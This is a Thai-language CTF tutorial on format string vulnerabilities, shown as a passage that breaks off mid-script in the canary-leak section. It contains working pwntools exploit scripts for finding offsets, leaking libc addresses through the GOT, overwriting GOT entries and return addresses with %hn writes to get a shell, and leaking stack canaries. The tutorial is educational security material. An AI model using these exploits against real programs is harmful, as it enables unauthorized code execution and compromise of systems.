# Part 075: Format String Vulnerabilities (Educational)

> **คำเตือน / Disclaimer**: เนื้อหานี้จัดทำขึ้นเพื่อการศึกษาและการแข่งขัน CTF (Capture The Flag) เท่านั้น  
> การนำความรู้นี้ไปใช้โจมตีระบบที่ไม่ได้รับอนุญาตถือเป็นความผิดทางกฎหมาย

---

## สารบัญ (Table of Contents)

1. [Introduction to Format String Vulnerabilities](#1-introduction)
2. [printf Internals: Format String Parsing](#2-printf-internals)
3. [va_arg Stack Access](#3-va_arg-stack-access)
4. [Format Specifiers and Their Effects](#4-format-specifiers)
5. [Reading Stack Values with %x](#5-reading-stack-with-x)
6. [Reading Arbitrary Memory with %s](#6-reading-arbitrary-memory)
7. [Writing to Memory with %n](#7-writing-with-n)
8. [Short Writes: %hn, %hhn, %ln](#8-short-writes)
9. [Finding the Offset](#9-finding-offset)
10. [Arbitrary Read: Finding Pointer to Target](#10-arbitrary-read)
11. [Arbitrary Write: Overwriting GOT Entry](#11-arbitrary-write-got)
12. [Overwriting Return Address with %n](#12-overwrite-return-address)
13. [printf in 64-bit: Registers then Stack](#13-printf-64bit)
14. [64-bit Format String Differences](#14-64bit-differences)
15. [Bypass Stack Canary via Leak](#15-bypass-canary)
16. [Heap-based Format String](#16-heap-based)
17. [Defense Mechanisms](#17-defense)
18. [pwntools: fmtstr_payload](#18-pwntools)
19. [CTF Examples and Practice](#19-ctf-examples)
20. [Summary and Cheat Sheet](#20-summary)

---

## 1. Introduction to Format String Vulnerabilities

### ภาพรวม (Overview)

Format String Vulnerability เป็นช่องโหว่ที่เกิดขึ้นเมื่อโปรแกรมส่ง **user-controlled input** ไปยัง format string functions เช่น `printf`, `sprintf`, `fprintf` โดยตรง โดยไม่มี format specifier

**โค้ดที่มีช่องโหว่:**
```c
// VULNERABLE - ช่องโหว่!
printf(user_input);

// SAFE - ปลอดภัย
printf("%s", user_input);
```

เพียงแค่ความแตกต่างเล็กน้อยนี้ทำให้เกิดช่องโหว่ร้ายแรงได้

### ประวัติความเป็นมา (History)

- ค้นพบในช่วงปลายทศวรรษ 1990s โดย **Solar Designer** และคนอื่นๆ
- CVE แรกๆ ที่เกี่ยวกับ format string: wu-ftpd (2000), IRIX telnetd (2001)
- ปัจจุบันยังพบได้ใน embedded systems, legacy code, และ CTF challenges

### ระดับความรุนแรง (Severity)

Format string vulnerabilities สามารถทำได้:
1. **Information Disclosure** - อ่านข้อมูลจาก stack/memory
2. **Arbitrary Read** - อ่านข้อมูลจาก address ใดก็ได้
3. **Arbitrary Write** - เขียนข้อมูลไปยัง address ใดก็ได้
4. **Code Execution** - รัน shellcode/ROP chains

---

## 2. printf Internals: Format String Parsing

### วิธีที่ printf ทำงาน (How printf Works)

เมื่อ `printf` ถูกเรียก มันจะ:
1. รับ format string เป็น argument แรก
2. scan format string ทีละ character
3. เมื่อพบ `%` จะอ่าน specifier ที่ตามมา
4. ดึง argument ถัดไปจาก stack (หรือ register ใน 64-bit)
5. แสดงผลตาม specifier

### การ parse format string ภายใน

```c
// Simplified printf implementation (conceptual)
void my_printf(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    
    const char *p = fmt;
    while (*p != '\0') {
        if (*p != '%') {
            putchar(*p);
            p++;
            continue;
        }
        
        p++; // skip '%'
        
        switch (*p) {
            case 'd':
                // ดึง int จาก va_list
                printf_int(va_arg(args, int));
                break;
            case 'x':
                // ดึง unsigned int จาก va_list
                printf_hex(va_arg(args, unsigned int));
                break;
            case 's':
                // ดึง pointer จาก va_list แล้ว print string
                printf_str(va_arg(args, char*));
                break;
            case 'n':
                // เขียนจำนวน chars ที่พิมพ์ไปยัง pointer
                int *ptr = va_arg(args, int*);
                *ptr = chars_printed;
                break;
        }
        p++;
    }
    va_end(args);
}
```

### Stack Layout เมื่อ printf ถูกเรียก

```
Stack Memory Layout (32-bit):
┌─────────────────────────────┐
│ Return Address              │ ← saved EIP
├─────────────────────────────┤
│ Saved EBP                   │
├─────────────────────────────┤
│ Local Variables             │
├─────────────────────────────┤  ← ESP เมื่อ printf ถูกเรียก
│ format string pointer       │ ← arg[0]: fmt
├─────────────────────────────┤
│ argument 1                  │ ← arg[1]
├─────────────────────────────┤
│ argument 2                  │ ← arg[2]
├─────────────────────────────┤
│ argument 3                  │ ← arg[3]
├─────────────────────────────┤
│ ...                         │
└─────────────────────────────┘
```

**ปัญหา**: ถ้า format string มี `%x%x%x` มากกว่า arguments จริงๆ  
printf จะยังคง "ดึง" ค่าจาก stack ต่อไป แม้จะไม่ใช่ arguments ที่ส่งมา

---

## 3. va_arg Stack Access

### Variadic Functions ใน C

`printf` เป็น variadic function ที่ใช้ `va_list` mechanism

```c
#include <stdarg.h>

// Prototype
int printf(const char *format, ...);

// การทำงานภายใน
void example(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);      // ap ชี้ไปที่ argument แรกหลัง fmt
    
    int val = va_arg(ap, int);    // อ่าน int แล้วเลื่อน ap
    char *str = va_arg(ap, char*); // อ่าน pointer แล้วเลื่อน ap
    
    va_end(ap);
}
```

### va_arg ใน Assembly (32-bit)

```nasm
; va_arg(ap, int) แปลงเป็น assembly ประมาณนี้:
; ap เก็บ pointer ไปยัง stack

mov eax, [ap]      ; อ่านค่าที่ ap ชี้
add dword [ap], 4  ; เลื่อน ap ไปข้างหน้า 4 bytes (sizeof int)
```

### ตัวอย่างการ Access Stack

```c
// โปรแกรมที่มีช่องโหว่
#include <stdio.h>

void vulnerable(char *input) {
    printf(input);  // ช่องโหว่ที่นี่!
}

int main() {
    char buf[256];
    fgets(buf, sizeof(buf), stdin);
    vulnerable(buf);
    return 0;
}
```

เมื่อส่ง `%x%x%x%x` printf จะดึงค่าจาก stack:

```
Input: %x%x%x%x
Output: bffff4c0 b7e7d410 bffff4d8 b7e7d410
         ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
         stack[0] stack[1] stack[2] stack[3]
```

---

## 4. Format Specifiers and Their Effects

### ตารางสรุป Format Specifiers

| Specifier | ประเภท | ขนาด | ผลกระทบ |
|-----------|--------|-------|---------|
| `%d` | int | 4 bytes | แสดงเป็นทศนิยมมีเครื่องหมาย |
| `%i` | int | 4 bytes | เหมือน %d |
| `%u` | unsigned int | 4 bytes | แสดงเป็นทศนิยมไม่มีเครื่องหมาย |
| `%x` | unsigned int | 4 bytes | แสดงเป็น hex (lowercase) |
| `%X` | unsigned int | 4 bytes | แสดงเป็น hex (uppercase) |
| `%o` | unsigned int | 4 bytes | แสดงเป็น octal |
| `%s` | char* | pointer | dereferenced pointer, แสดง string |
| `%p` | void* | pointer | แสดง pointer ในรูป 0xHHHH |
| `%c` | int | 4 bytes | แสดงเป็น character เดียว |
| `%n` | int* | pointer | **เขียน** ไม่แสดง |
| `%hn` | short* | pointer | เขียน 2 bytes |
| `%hhn` | char* | pointer | เขียน 1 byte |
| `%ln` | long* | pointer | เขียน 4/8 bytes |
| `%lln` | long long* | pointer | เขียน 8 bytes |

### Width Specifiers

```
%10d   - padding ซ้ายด้วย spaces ให้กว้าง 10 chars
%-10d  - padding ขวาด้วย spaces
%010d  - padding ซ้ายด้วย zeros
%*d    - ใช้ argument เป็น width
```

### Direct Parameter Access (Position Argument)

```
%N$x   - อ่าน argument ที่ N โดยตรง (1-indexed)
%3$x   - อ่าน argument ที่ 3
%1$n   - เขียนไปยัง argument ที่ 1 (ซึ่งต้องเป็น pointer)
```

ตัวอย่าง:
```c
printf("%2$x %1$x", 0xAAAA, 0xBBBB);
// Output: bbbb aaaa
// %2$x อ่าน argument ที่ 2 ก่อน แล้ว %1$x อ่าน argument ที่ 1
```

---

## 5. Reading Stack Values with %x

### เทคนิคพื้นฐาน: AAAA%08x%08x%08x...

```python
# Python script สำหรับทดสอบ
payload = b"AAAA" + b"%08x." * 20
# ส่ง payload ไปยังโปรแกรม
```

ผลลัพธ์ที่ได้:
```
AAAA41414141.bffff4c0.b7e7d410.bffff4d8.b7e7d410.00000000...
                                                    ^^^^^^^^
                                                    0x41414141 = "AAAA"
```

### การนับ offset

เมื่อเห็น `41414141` เราทราบว่า format string ของเราอยู่ที่ offset ไหน

```
AAAA + %08x * N จนกว่าจะเห็น 41414141
```

**ตัวอย่างการทำงาน:**

```c
// โปรแกรม vulnerable
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buf[200];
    if (argc > 1) {
        strncpy(buf, argv[1], sizeof(buf)-1);
        printf(buf);  // VULNERABLE
    }
    return 0;
}
```

```bash
# ทดสอบ
./vuln "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
# Output: AAAAbffff9a8.00000000.b7fe6ffe.b7fffac0.b7fff000.00000000.bffff9b8.41414141
#                                                                              ^^^^^^^^
#         offset 7!
```

### Automating Offset Discovery

```python
#!/usr/bin/env python3
from pwn import *

def find_offset(binary_path):
    for i in range(1, 50):
        p = process(binary_path)
        payload = f"AAAA%{i}$x"
        p.sendline(payload.encode())
        output = p.recv()
        p.close()
        
        if b"41414141" in output:
            print(f"[+] Offset found: {i}")
            return i
    
    print("[-] Offset not found")
    return None
```

### การใช้ %p แทน %x

```
AAAA%p%p%p...
```

`%p` จะแสดง pointer format ซึ่งดูง่ายกว่า และแสดง `(nil)` แทน NULL pointer

```bash
./vuln "AAAA%p.%p.%p.%p.%p.%p.%p.%p"
# Output: AAAA0xbffff9a8.(nil).0xb7fe6ffe.0xb7fffac0.0xb7fff000.(nil).0xbffff9b8.0x41414141
```

---

## 6. Reading Arbitrary Memory with %s

### วิธีการ: %s Dereferences Pointer

`%s` ทำการ dereference pointer แล้ว print string:

```
[stack: 0xdeadbeef] → printf("%s") → พิมพ์ string ที่ 0xdeadbeef
```

### ขั้นตอนการ Arbitrary Read

1. หา offset ของ format string บน stack
2. วาง address ที่ต้องการอ่านไว้ใน format string
3. ใช้ `%N$s` เพื่ออ่านที่ address นั้น

```python
# สมมติ offset = 7
target_addr = 0x08049030  # address ที่ต้องการอ่าน

# 32-bit little-endian
payload = p32(target_addr) + b"%7$s"

# หรือใช้ direct parameter access
payload = p32(target_addr) + b"%7$s"
```

### ตัวอย่างอ่าน GOT entry

```python
from pwn import *

# ไฟล์ binary
elf = ELF('./vuln')

# หา address ของ puts@got
puts_got = elf.got['puts']
print(f"puts@GOT = {hex(puts_got)}")

# สร้าง payload
offset = 7  # offset ที่หาได้ก่อนหน้า
payload = p32(puts_got) + f"%{offset}$s".encode()

# รัน
p = process('./vuln')
p.sendline(payload)
output = p.recv(8)

# อ่านค่า libc address
libc_puts = u32(output[4:8])
print(f"puts@libc = {hex(libc_puts)}")
```

### ปัญหา: NULL bytes ใน Address

```
address: 0x08049030
bytes: \x30\x90\x04\x08

ถ้า address มี NULL byte (0x00) เช่น 0x0804a000:
bytes: \x00\xa0\x04\x08
                      ↑ NULL byte จะหยุดการอ่าน string!
```

**วิธีแก้ใน 32-bit:**
- วาง address ไว้ท้าย payload แทนที่จะวางต้น

```python
# วิธีที่ดีกว่า: วาง address ท้าย payload
payload = b"START%7$s" + p32(target_addr)
```

### อ่าน Memory ต่อเนื่อง (Memory Scanning)

```python
#!/usr/bin/env python3
from pwn import *

def read_address(p, addr, offset):
    payload = p32(addr) + f"%{offset}$s".encode()
    p.sendline(payload)
    response = p.recv()
    # Extract data after our address
    return response[4:]

# Scan through memory
for addr in range(0x08048000, 0x08049000, 4):
    try:
        data = read_address(proc, addr, 7)
        if data:
            print(f"{hex(addr)}: {data[:20]}")
    except:
        pass
```

---

## 7. Writing to Memory with %n

### %n คืออะไร?

`%n` เป็น format specifier พิเศษที่ **เขียน** จำนวน characters ที่พิมพ์ออกไปแล้ว ไปยัง pointer ที่ชี้โดย argument

```c
int n;
printf("Hello%n", &n);
// n จะมีค่า 5 (จำนวน chars ใน "Hello")
```

### การใช้ %n เพื่อเขียน Arbitrary Value

ต้องการเขียนค่า `0x41` (65) ไปยัง address:
1. พิมพ์ 65 characters ก่อน
2. แล้วใช้ `%n`

```python
target_addr = 0xdeadbeef
offset = 7
value_to_write = 0x41  # 65

# จำนวน chars ที่ต้องพิมพ์ก่อน = value_to_write - 4 (ขนาดของ address ที่เราวาง)
padding = value_to_write - 4

payload = p32(target_addr) + f"%{padding}c%{offset}$n".encode()
```

### หลักการทำงานของ %n Write

```
payload: [ADDR][PADDING][%N$n]
         4 bytes + padding bytes = total_chars_printed
         
%N$n เขียน total_chars_printed ไปยัง [ADDR]
```

### ตัวอย่างเขียนค่า 0x61626364

```
ต้องการเขียน: 0x61626364 = 1633837924

แต่เราไม่สามารถพิมพ์ 1,633,837,924 characters ได้!
```

**วิธีแก้: ใช้ Short Writes (%hn หรือ %hhn)**

---

## 8. Short Writes: %hn, %hhn, %ln

### ทำไมต้อง Short Write?

การเขียนค่าขนาดใหญ่ด้วย `%n` ต้องพิมพ์ characters จำนวนมาก  
เช่น เขียน `0xdeadbeef` ต้องพิมพ์ 3,735,928,559 characters!

แทนที่เราจะแบ่งการเขียนออกเป็นส่วนๆ:

### %hn - Short Write (2 bytes)

```c
short s;
printf("%" "65535" "c%hn", &s);
// เขียน 0xFFFF ไปยัง s (2 bytes เท่านั้น)
```

### %hhn - Byte Write (1 byte)

```c
char c;
printf("%" "255" "c%hhn", &c);
// เขียน 0xFF ไปยัง c (1 byte เท่านั้น)
```

### %ln - Long Write (4/8 bytes)

```c
long l;
printf("%n", &l);  // ใน 32-bit: 4 bytes, 64-bit: 8 bytes
```

### %lln - Long Long Write (8 bytes)

```c
long long ll;
printf("%lln", &ll);  // เสมอ 8 bytes
```

### การเขียน 4 bytes โดยแบ่งเป็น 2 ครั้ง (%hn)

ต้องการเขียน `0xDEADBEEF` ไปยัง address `0x08049020`:

```
แบ่งเป็น:
- เขียน 0xBEEF (48879) ไปยัง 0x08049020 (low word)
- เขียน 0xDEAD (57005) ไปยัง 0x08049022 (high word)
```

```python
target = 0x08049020
low_val = 0xBEEF   # 48879
high_val = 0xDEAD  # 57005
offset = 7

# วาง address ทั้งสอง
addrs = p32(target) + p32(target + 2)

# คำนวณ padding
# low_val - len(addrs) = 48879 - 8 = 48871
pad1 = low_val - len(addrs)

# high_val - low_val (ต้องบวกถ้า high > low, ลบถ้า high < low)
if high_val > low_val:
    pad2 = high_val - low_val
else:
    pad2 = high_val + 0x10000 - low_val  # wrap around

payload = addrs
payload += f"%{pad1}c%{offset}$hn".encode()
payload += f"%{pad2}c%{offset+1}$hn".encode()
```

### การเขียน 4 bytes โดยแบ่งเป็น 4 ครั้ง (%hhn) - วิธีที่แม่นยำที่สุด

```python
def build_fmt_write(addr, value, offset):
    """สร้าง payload สำหรับเขียน 4 bytes ด้วย %hhn"""
    
    # แบ่ง value เป็น 4 bytes
    b0 = (value >> 0)  & 0xFF
    b1 = (value >> 8)  & 0xFF
    b2 = (value >> 16) & 0xFF
    b3 = (value >> 24) & 0xFF
    
    bytes_to_write = [b0, b1, b2, b3]
    addrs = b"".join(p32(addr + i) for i in range(4))
    
    payload = addrs
    prev = len(addrs)  # chars already printed
    
    for i, byte_val in enumerate(bytes_to_write):
        # คำนวณจำนวน chars ที่ต้องพิมพ์เพิ่ม
        diff = (byte_val - prev) % 256
        if diff == 0:
            diff = 256  # ต้องพิมพ์อีก 256 เพื่อ overflow
        
        payload += f"%{diff}c%{offset+i}$hhn".encode()
        prev = byte_val
    
    return payload
```

---

## 9. Finding the Offset

### วิธีที่ 1: Manual Method

```bash
# ส่ง AAAA แล้วตามด้วย %x จำนวนมาก
python3 -c "print('AAAA' + '%08x.' * 30)" | ./vuln
```

นับว่า `41414141` อยู่ที่ตำแหน่งที่เท่าไหร่ (นับจาก 1)

### วิธีที่ 2: ใช้ Unique Marker

```python
# ใช้ cyclic pattern แทน AAAA
from pwn import cyclic
marker = cyclic(4)  # 'aaaa'
payload = marker + b"%08x." * 30
```

### วิธีที่ 3: ใช้ Script อัตโนมัติ

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)

def find_fmt_offset(binary, stdin_input=True):
    """หา offset ของ format string บน stack"""
    
    for offset in range(1, 100):
        p = process(binary)
        
        # ใช้ unique pattern
        marker = b"AAAA"
        fmt = f"%{offset}$x"
        payload = marker + fmt.encode()
        
        if stdin_input:
            p.sendline(payload)
        
        try:
            output = p.recvall(timeout=1)
            p.close()
            
            if b"41414141" in output:
                log.success(f"Offset found at position {offset}")
                return offset
        except:
            p.close()
            continue
    
    return None

offset = find_fmt_offset(binary)
print(f"Format string offset: {offset}")
```

### วิธีที่ 4: ใช้ GDB

```bash
# ใน GDB
gdb ./vuln

# ตั้ง breakpoint ที่ printf
(gdb) break printf
(gdb) run

# เมื่อหยุด ดู stack
(gdb) x/20xw $esp

# หาว่า input อยู่ที่ offset ไหน
```

### วิธีที่ 5: Brute Force ด้วย pwntools

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

for i in range(1, 50):
    p = process('./vuln')
    p.sendline(f'AAAA%{i}$x'.encode())
    data = p.recvall(timeout=0.5)
    p.close()
    
    if b'41414141' in data:
        print(f'[+] Offset: {i}')
        break
    else:
        print(f'[-] Offset {i}: {data}')
```

### ตัวอย่างผลลัพธ์และการวิเคราะห์

```
AAAA%1$x  → AAAAbffff5c0   (ไม่ใช่)
AAAA%2$x  → AAAA00000000   (ไม่ใช่)
AAAA%3$x  → AAAAb7e7d410   (ไม่ใช่)
...
AAAA%7$x  → AAAA41414141   (เจอแล้ว! offset = 7)
```

---

## 10. Arbitrary Read: Finding Pointer to Target

### เทคนิค: วาง Address แล้วอ่านด้วย %s

```
Stack ตอนที่ printf ทำงาน:
[esp]   → format string: "AAAA%7$s"
[esp+4] → (ไม่มี argument)
...
[ที่ offset 7 บน stack] → "AAAA" ← นี่คือ format string เอง!
```

ดังนั้นถ้าเราใส่ address แทน "AAAA":

```
Format string: [ADDR][%7$s]
Stack ที่ offset 7 จะมี ADDR
%7$s จะ dereference ADDR แล้วพิมพ์ string ที่นั่น
```

### ตัวอย่างอ่าน libc address จาก GOT

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# หา address
puts_got = elf.got['puts']
print(f"puts@GOT = {hex(puts_got)}")

offset = 7  # offset ที่หาได้

# สร้าง payload สำหรับอ่าน
payload = p32(puts_got) + f"%{offset}$s".encode()

p = process(binary)
p.sendline(payload)

# รับ response
response = p.recv()

# Extract address (หลังจาก 4 bytes แรกที่เป็น address ที่เราวาง)
# ต้องระวัง NULL byte
leaked = u32(response[4:8].ljust(4, b'\x00'))
print(f"Leaked puts@libc = {hex(leaked)}")

# คำนวณ libc base
libc_base = leaked - libc.symbols['puts']
print(f"libc base = {hex(libc_base)}")

# คำนวณ system address
system_addr = libc_base + libc.symbols['system']
print(f"system() = {hex(system_addr)}")

p.close()
```

### เทคนิค: การอ่านหลาย Addresses

```python
# อ่านหลาย addresses ในคราวเดียว
addrs = [puts_got, printf_got, read_got]

payload = b"".join(p32(a) for a in addrs)
for i, addr in enumerate(addrs):
    payload += f"%{offset+i}$s".encode()
```

---

## 11. Arbitrary Write: Overwriting GOT Entry

### GOT (Global Offset Table) คืออะไร?

GOT เป็นตารางที่เก็บ addresses ของ library functions  
เมื่อเรียก `puts()` จริงๆ แล้ว program จะ:
1. Jump ไปที่ `puts@plt`
2. `puts@plt` อ่าน address จาก `puts@got`
3. Jump ไปยัง address นั้น (libc puts)

**ถ้าเราสามารถเปลี่ยนค่าใน GOT ได้ เราสามารถ redirect การเรียก function ใดก็ได้!**

### การ Overwrite GOT: แนวคิด

```
เป้าหมาย: เมื่อ puts() ถูกเรียก ให้ jump ไป system() แทน

ขั้นตอน:
1. หา address ของ puts@GOT
2. หา address ของ system() ใน libc
3. เขียน system() address ไปที่ puts@GOT
```

### ตัวอย่างการ Overwrite GOT (32-bit)

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# ขั้นตอน 1: Leak libc address
# (ทำก่อน ดูตัวอย่างในส่วน 10)
libc_base = 0xb75e2000  # สมมติค่านี้ได้จาก leak

# ขั้นตอน 2: คำนวณ target addresses
system = libc_base + libc.symbols['system']
puts_got = elf.got['puts']
offset = 7

print(f"system() = {hex(system)}")
print(f"puts@GOT = {hex(puts_got)}")

# ขั้นตอน 3: สร้าง format string payload
# แบ่งการเขียนเป็น 2 short writes
lo = system & 0xFFFF         # lower 2 bytes
hi = (system >> 16) & 0xFFFF  # upper 2 bytes

# วาง addresses
addrs = p32(puts_got) + p32(puts_got + 2)  # 8 bytes

already_printed = len(addrs)

if lo > already_printed:
    pad1 = lo - already_printed
else:
    pad1 = lo + 0x10000 - already_printed

if hi > lo:
    pad2 = hi - lo
else:
    pad2 = hi + 0x10000 - lo

fmt = f"%{pad1}c%{offset}$hn%{pad2}c%{offset+1}$hn"
payload = addrs + fmt.encode()

p = process(binary)
p.sendline(b"/bin/sh\x00")  # ส่ง argument ไปก่อน (ขึ้นกับ context)
p.sendline(payload)

p.interactive()
```

### ตรวจสอบด้วย GDB

```bash
gdb ./vuln

# Set breakpoint ก่อน/หลัง printf
(gdb) break *main+XX
(gdb) run

# หลัง format string attack
(gdb) x/xw 0x08049020    # ดู puts@GOT
# ควรเห็นค่าของ system()
```

---

## 12. Overwriting Return Address with %n

### แนวคิด

แทนที่จะ overwrite GOT เราสามารถ overwrite return address บน stack ได้โดยตรง

**ข้อดี:**
- ไม่ต้องการ memory leak ก่อน (ถ้ารู้ stack address)
- ทำงานกับ ASLR ปิด

**ข้อเสีย:**
- ต้องการ stack address (ยากถ้า ASLR เปิด)
- มักถูก stack canary ป้องกัน

### การหา Return Address บน Stack

```bash
# ใน GDB
(gdb) info frame
# จะเห็น saved eip/rip address

# หรือดู stack ตรงๆ
(gdb) x/20xw $esp
```

### ตัวอย่าง: Overwrite Return Address (32-bit, no ASLR, no canary)

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln_stack'

# หา stack address ของ return address
# สมมติว่าหาได้จาก GDB หรือ leak
ret_addr_location = 0xbffff4cc

# Target: address ของ win() function หรือ shellcode
elf = ELF(binary)
win_addr = elf.symbols['win']

offset = 7  # format string offset

# สร้าง payload
lo = win_addr & 0xFFFF
hi = (win_addr >> 16) & 0xFFFF

addrs = p32(ret_addr_location) + p32(ret_addr_location + 2)
already_printed = len(addrs)

if lo >= already_printed:
    pad1 = lo - already_printed
else:
    pad1 = lo + 0x10000 - already_printed

if hi > lo:
    pad2 = hi - lo
elif hi == lo:
    pad2 = 0x10000  # เพิ่ม full 65536
else:
    pad2 = hi + 0x10000 - lo

payload = addrs
payload += f"%{pad1}c%{offset}$hn".encode()
payload += f"%{pad2}c%{offset+1}$hn".encode()

p = process(binary)
p.sendline(payload)
output = p.recv()
print(output)
p.interactive()
```

### Stack Layout ก่อนและหลัง Attack

```
ก่อน Attack:
┌──────────────────────┐
│ Return Address       │ ← 0xb7e8a000 (main+XX)
├──────────────────────┤
│ Saved EBP            │
├──────────────────────┤
│ buf[200]             │ ← format string อยู่ที่นี่
└──────────────────────┘

หลัง Attack:
┌──────────────────────┐
│ Return Address       │ ← 0x08048600 (win())  ← ถูกเปลี่ยน!
├──────────────────────┤
│ Saved EBP            │
├──────────────────────┤
│ buf[200]             │
└──────────────────────┘
```

---

## 13. printf in 64-bit: Args from Registers, then Stack

### การส่ง Arguments ใน 64-bit (System V AMD64 ABI)

ใน 64-bit Linux ตาม System V ABI arguments ถูกส่งผ่าน:

```
Register Order:
RDI → arg1 (format string)
RSI → arg2
RDX → arg3
RCX → arg4
R8  → arg5
R9  → arg6
[stack] → arg7, arg8, arg9, ...
```

### ผลต่อ Format String

```c
printf("%x %x %x %x %x %x %x %x", a, b, c, d, e, f, g, h);
//      %x   %x   %x   %x   %x   %x    %x   %x
//      RSI  RDX  RCX  R8   R9  [rsp]  ...  ...
```

**ดังนั้น:**
- `%1$x` = RSI
- `%2$x` = RDX
- `%3$x` = RCX
- `%4$x` = R8
- `%5$x` = R9
- `%6$x` = [rsp+0]   ← stack argument เริ่มที่ 6
- `%7$x` = [rsp+8]
- ...

### ตัวอย่างใน 64-bit

```bash
# โปรแกรม 64-bit vulnerable
gcc -x64 -o vuln64 vuln.c

# ทดสอบ
./vuln64 "AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p"
# Output: AAAAAAAA0x7fffffffe4c0.(nil).0x7ffff7de0fc0.0x7ffff7fe5980.0x7ffff7fe5980.0x4141414141414141...
#                                                                                      ^^^^^^^^^^^^^^^^^^^
#         address ของ format string อยู่ที่ offset 6
```

### Stack Layout ใน 64-bit printf

```
เมื่อ printf("AAAA%p%p%p...", arg1, ...) ถูกเรียก:

RDI = pointer ไปยัง format string
RSI = arg1
RDX = arg2
RCX = arg3
R8  = arg4
R9  = arg5

Stack:
[rsp]    = return address
[rsp+8]  = arg6 (ถ้ามี)
[rsp+16] = arg7 (ถ้ามี)
...

ใน printf's frame:
format string อาจอยู่บน stack ที่ offset ~6
```

### หา Offset ใน 64-bit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './vuln64'

for i in range(1, 30):
    p = process(binary)
    marker = b'AAAAAAAA'  # 8 bytes ใน 64-bit
    payload = marker + f'%{i}$p'.encode()
    p.sendline(payload)
    
    try:
        data = p.recvall(timeout=1)
        p.close()
        
        if b'0x4141414141414141' in data:
            print(f'[+] Offset: {i}')
            break
    except:
        p.close()
```

---

## 14. 64-bit Format String Differences

### ความแตกต่างหลักระหว่าง 32-bit และ 64-bit

| ด้าน | 32-bit | 64-bit |
|------|--------|--------|
| Pointer Size | 4 bytes | 8 bytes |
| Arguments | ทั้งหมดบน stack | Register แล้วค่อย stack |
| NULL bytes | address มักไม่มี NULL | address มักมี NULL หลาย bytes! |
| %n write | เขียน 4 bytes | เขียน 8 bytes (long) |
| Alignment | 4-byte aligned | 8-byte aligned |

### ปัญหา NULL bytes ใน 64-bit Addresses

```
64-bit address ตัวอย่าง: 0x00007ffff7a3b580
bytes: \x80\xb5\xa3\xf7\xff\x7f\x00\x00

มี 2 NULL bytes ท้าย!
```

**NULL bytes ทำให้ `scanf`, `gets`, `strcpy` หยุดอ่าน/เขียน**

### วิธีแก้ปัญหา NULL bytes ใน 64-bit

**วิธีที่ 1: วาง address ท้าย payload**

```python
# ไม่ดี: address ต้น payload
payload = p64(target) + b"%6$s"  # มี NULL bytes → ตัด payload

# ดีกว่า: address ท้าย payload  
# แต่ offset จะเปลี่ยนไปด้วย เพราะ address ไม่ได้อยู่ใน position เดิม
```

**วิธีที่ 2: ใช้ pwntools fmtstr_payload**

```python
from pwn import *
# pwntools จัดการ NULL bytes ให้อัตโนมัติ
payload = fmtstr_payload(offset, {target_addr: value}, numbwritten=0)
```

### การคำนวณ Offset ใน 64-bit

เนื่องจาก 6 arguments แรกเป็น registers ดังนั้น:

```
%1$p → RSI (arg1 หลัง format string)
%2$p → RDX
%3$p → RCX
%4$p → R8
%5$p → R9
%6$p → [rsp+8] ← stack starts here (ขึ้นกับ alignment)
```

**หมายเหตุ:** offset 6 อาจไม่ใช่ format string เสมอไป ขึ้นกับ stack alignment และ callee

### ตัวอย่าง 64-bit Format String Attack

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = './vuln64'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process(binary)

# ขั้นตอน 1: Leak libc address
puts_got = elf.got['puts']
offset = 6  # offset ของ format string บน stack

payload = p64(puts_got) + f"%{offset}$s".encode()

# ปัญหา: p64(puts_got) อาจมี NULL bytes!
# วิธีแก้: ใช้ offset ที่ถูกต้องและจัดการ padding

p.sendline(payload)
response = p.recv()

# ดึง leaked address (8 bytes หลัง address ที่เราวาง)
leaked_puts = u64(response[8:16].ljust(8, b'\x00'))
print(f"Leaked puts: {hex(leaked_puts)}")
```

---

## 15. Bypass Stack Canary via Leak → Recalculate

### Stack Canary คืออะไร?

Stack Canary เป็น random value ที่ compiler ใส่ไว้บน stack  
ก่อน function return จะตรวจสอบว่าค่ายังเหมือนเดิมไหม

```
Stack Layout with Canary:
┌──────────────────────┐
│ Return Address       │
├──────────────────────┤
│ Saved EBP/RBP        │
├──────────────────────┤
│ Stack Canary         │ ← ค่า random เช่น 0x8b2f4a1c00
├──────────────────────┤
│ Local Variables      │
└──────────────────────┘
```

### Format String สามารถ Leak Canary ได้!

เนื่องจาก Format String สามารถอ่านค่าจาก stack ได้  
เราสามารถอ่าน Canary value ก่อน แล้วนำมาใส่ใน payload

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln_canary'
elf = ELF(binary)

# หา offset ของ canary บน stack
# ใน 64-bit, canary มักอยู่ที่ offset ~11 (ขึ้นกับ binary)
# ต้องทดสอบเพื่อหา offset จริง

canary_offset = 11  # สมมติว่าหาได้

p = process(binary)

# ขั้นตอน 1: Leak canary
p.sendline(f"%{canary_offset}$p".encode())
canary_hex = p.recv().strip()
canary = int(canary_hex, 16)

print(f"Leaked canary: {hex(canary)}")

# ตรวจสอบ: canary มักลงท้ายด้วย \x00
assert (canary & 0xFF) == 0, f"Not a canary? {hex(canary)}"
```

### หา Canary Offset

```bash
# วิธีที่ 1: GDB
gdb ./vuln_canary

(gdb) break main
(gdb) run
(gdb) info frame
# ดู canary location

# วิธีที่ 2: Script อัตโนมัติ
```

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

for offset in range(1, 50):
    p = process('./vuln_canary')
    p.sendline(f"%{offset}$p".encode())
    
    try:
        data = p.recvall(timeout=0.5)
        val = data.strip()
        
        if val.startswith(b'0x') and val.endswith(b'00'):
            potential_canary = int(val, 16)
